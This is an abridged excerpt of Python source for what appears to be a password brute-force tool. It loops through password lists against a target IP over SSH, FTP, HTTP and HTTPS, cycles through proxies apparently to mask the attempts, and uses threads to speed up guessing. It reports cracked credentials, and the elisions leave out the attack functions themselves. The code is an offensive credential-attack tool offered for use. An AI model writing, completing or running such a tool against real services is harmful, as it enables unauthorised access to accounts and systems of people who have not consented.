...
def process_password_chunk(user, passwords, service, args, proxy_gen=None):
    results = []
    for password in passwords:
        proxy_ip, proxy_port = next(proxy_gen) if proxy_gen else (None, None)
        
        if 'ssh' in service:
            result = ssh_attack(args.ip, args.service[1], user, password, proxy_ip, proxy_port)
        elif 'ftp' in service:
            result = ftp_attack(args.ip, user, password, proxy_ip, proxy_port)
        elif 'http' in service:
            result = http_attack(args.ip, user, password, 
            ...
            result = https_attack(args.ip, user, password,
                                https_post_params=args.http_post,
                                success_pattern=args.success_pattern,
                                failure_pattern=args.failure_pattern,
                                success_content_length=args.success_content_length,
                                failure_content_length=args.failure_content_length,
...
def parse_arguments():
    ...
    parser.add_argument('--fast-mode', action='store_true', 
                       help="Use threading to process iterations in parallel")
...
# Check for random agent and session usage
    ...
    elif not args.user:  # Add this check
        parser.error("Either --user or --users must be specified")
...
def cycle_through_proxies(proxies):
    """Generator function to cycle through proxy list endlessly"""
    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Cycling proxies", level=2)
    while True:
        for proxy in proxies:
            try:
                ...
                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Invalid proxy format: {proxy}")
                continue
...
if __name__ == '__main__':
    # At the start of the main block, define these variables
    attempt_count = 0
    user = None
    password = None
    users = []
    ...
    try:
        ...
        if args.fast_mode:
            print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Fast mode enabled - Using {args.iterations} threads")
            
            with ThreadPoolExecutor(max_workers=args.iterations) as executor:
                futures = []
                
                for user in users:
                    # Split passwords into chunks for each thread
                    password_chunks = [passwords[i:i + len(passwords)//args.iterations] 
                                    for i in range(0, len(passwords), len(passwords)//args.iterations)]
                    
                    # Submit each chunk to thread pool
                    for chunk in password_chunks:
                        future = executor.submit(process_password_chunk, 
                                            user, chunk, service, args, proxy_gen)
                ...
                for future in futures:
                    ...
                    for user, password in results:
                        print(f"{Fore.WHITE}[{Fore.YELLOW}SUCCESS{Fore.WHITE}]{Fore.RESET} "
                            f"Found password for {user}: {password}")
